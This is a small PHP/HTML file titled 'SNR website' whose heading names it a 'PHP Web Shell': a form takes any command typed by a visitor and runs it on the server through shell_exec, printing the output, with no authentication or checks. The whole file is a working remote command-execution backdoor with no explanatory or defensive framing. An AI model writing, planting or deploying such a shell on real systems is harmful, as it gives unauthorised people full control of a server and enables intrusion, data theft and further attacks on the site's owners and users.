<!DOCTYPE html>
<html>
  <head>
    <title>SNR website</title>
  </head>
  <body>
    <h1>PHP Web Shell</h1>
    <form method="POST">
      <label>Enter a command:</label><br>
      <input type="text" name="cmd"><br>
      <input type="submit" value="Execute">
    </form>
    <?php
      if (isset($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
      }
    ?>
  </body>
</html>